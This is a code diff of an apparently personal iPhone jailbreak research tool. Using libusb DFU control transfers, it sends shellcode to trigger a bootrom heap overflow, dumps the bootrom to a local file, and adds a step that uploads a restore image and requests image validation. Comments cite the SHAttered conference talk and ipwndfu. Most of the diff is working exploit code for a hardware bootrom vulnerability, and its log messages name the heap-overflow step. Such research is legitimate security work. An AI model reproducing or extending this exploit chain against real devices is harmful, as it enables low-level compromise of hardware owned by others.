@@ -19,18 +19,6 @@ struct list_head {
     struct list_head *prev, *next;
 };
 
-/*
-struct libusb_device_handle {
-    /* lock protects claimed_interfaces *
-    usbi_mutex_t lock;
-    unsigned long claimed_interfaces;
-
-    struct list_head list;
-    struct libusb_device *dev;
-    unsigned char os_priv[0];
-};
- */
-
 struct libusb_device_handle {
     /* lock protects claimed_interfaces */
     usbi_mutex_t lock;
@@ -148,16 +136,27 @@ long readfile(char* filename, void* buffer) {
     return len;
 }
 
+uint32_t get_file_len(FILE* f) {
+    fseek(f, 0, SEEK_END);
+    uint32_t len = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    return len;
+}
+
 void get_status(struct libusb_device_handle* device_handle) {
     unsigned char status[6];
     int ret = libusb_control_transfer(device_handle, 0xa1, 3, 0, 0, status, 6, 100);
-    NSLog(@"get_status ret = %d, status = ", ret);
+    NSLog(@"get_status ret = %d", ret);
     for (int i = 0; i < 6; i++) {
-        NSLog(@"%02x", status[i]);
+        //NSLog(@"%02x", status[i]);
     }
 }
 
 void dfu_notify_upload_finished(struct libusb_device_handle* device_handle) {
+    // ipwndfu calls this "request_image_validation"
+    // Ref: https://archive.conference.hitb.org/hitbsecconf2013kul/materials/D2T1%20-%20Joshua%20'p0sixninja'%20Hill%20-%20SHAttered%20Dreams.pdf
+    // "Image validation starts whenever the global “file received” variable has been set."
+    // "This can be caused by sending 1 empty “Send Data” packet, and 3 “Get Status” packets followed by a USB reset."
     int ret = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, 0, 0, 100);
     for (int i = 0; i < 3; i++) {
         get_status(device_handle);
@@ -194,6 +193,7 @@ void inner_main(void) {
 #define BUF_SIZE 0x800
     unsigned char shellcode[BUF_SIZE] = {0};
     unsigned int stack_addr = EXPLOIT_LR;
+    // PT: Is the +1 to indicate THUMB?
     unsigned int shellcode_addr = LOADADDR + LOADADDR_SIZE - FOUR_K_PAGE + 1;
     
     // Read the shellcode into the buffer
@@ -231,32 +231,8 @@ void inner_main(void) {
     sent_bytes = libusb_control_transfer(device_handle, 0xa1, 1, 0, 0, buf, 0x800, 1000);
     NSLog(@"never freed %X", sent_bytes);
     
-    /*
-    IOReturn kresult;
-    IOUSBDevRequest req;
-    bzero(&req, sizeof(req));
-    //struct darwin_device_handle_priv *priv = (struct darwin_device_handle_priv *)client->handle->os_priv;
-    //struct darwin_device_priv *dpriv = (struct darwin_device_priv *)device_handle->dev->os_priv;
-    //struct darwin_device_priv *dpriv = (struct darwin_device_priv *)device_handle->dev->os_priv;
-    struct darwin_device_priv* dpriv = (struct darwin_device_priv*)device_handle->dev->session_data;
-    NSLog(@"dpriv %p", dpriv);
-    req.bmRequestType     = 0x21;
-    req.bRequest          = 1;
-    req.wValue            = OSSwapLittleToHostInt16 (0);
-    req.wIndex            = OSSwapLittleToHostInt16 (0);
-    req.wLength           = OSSwapLittleToHostInt16 (0x800);
-    req.pData             = buf + LIBUSB_CONTROL_SETUP_SIZE;
-    kresult = (*(dpriv->device))->DeviceRequestAsync(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
-    usleep(5 * 1000);
-    kresult = (*(dpriv->device))->USBDeviceAbortPipeZero (dpriv->device);
-     */
     sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, 0x800, 10);
     NSLog(@"new one %x", sent_bytes);
-    /*
-    sleep(1);
-    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, 0x800, 5000);
-    NSLog(@"new2 one %x", sent_bytes);
-    */
     
     sent_bytes = libusb_control_transfer(device_handle, 0x21, 2, 0, 0, buf, 0, 1000);
     NSLog(@"Sent exploit to heap overflow %X %s", sent_bytes, libusb_error_name(sent_bytes));
@@ -270,8 +246,7 @@ void inner_main(void) {
     NSLog(@"got handle2 %p", device_handle2);
     
     unsigned int addr = 0x0;
-    FILE* fout = fopen("/Users/philliptennen/Documents/Jailbreak/jailbreak/bootrom.bin", "wb");
-    NSLog(@"fout %p", fout);
+    FILE* fout = fopen("/Users/philliptennen/Documents/Jailbreak/jailbreak/rom.bin", "wb");
     unsigned char data[0x800] = {0};
     for (int addr = 0; addr < 0x10000; addr += 0x800) {
         int ret = libusb_control_transfer(device_handle2, 0xa1, 2, 0, 0, data, 0x800, 0);
@@ -281,6 +256,23 @@ void inner_main(void) {
     fclose(fout);
     
     NSLog(@"all done");
+    
+    // Now, try writing an ipsw to see what happens?!
+    FILE* ipsw = fopen("/Users/philliptennen/Downloads/iPhone3,1_6.1.3_10B329_Restore.ipsw", "rb");
+    uint32_t file_len = get_file_len(ipsw);
+    NSLog(@"IPSW is %d bytes", file_len);
+    unsigned char ipsw_data[0x8000] = {0};
+    for (int i = 0; i < file_len; i += 0x8000) {
+        char ipsw_buf[0x8000] = {0};
+        int read_bytes = fread(ipsw_buf, 1, 0x8000, ipsw);
+        NSLog(@"\tread %d bytes, progress = %.2f", read_bytes, (float)read_bytes / (float)file_len);
+        int ret = libusb_control_transfer(device_handle2, 0x21, 1, 0, 0, ipsw_buf, 0x8000, 3000);
+        NSLog(@"\t\tret %d", ret);
+    }
+    
+    NSLog(@"Upload finished, will ask device to validate...");
+    dfu_notify_upload_finished(device_handle);
+    
     libusb_close(device_handle);
     libusb_exit(context);
 }
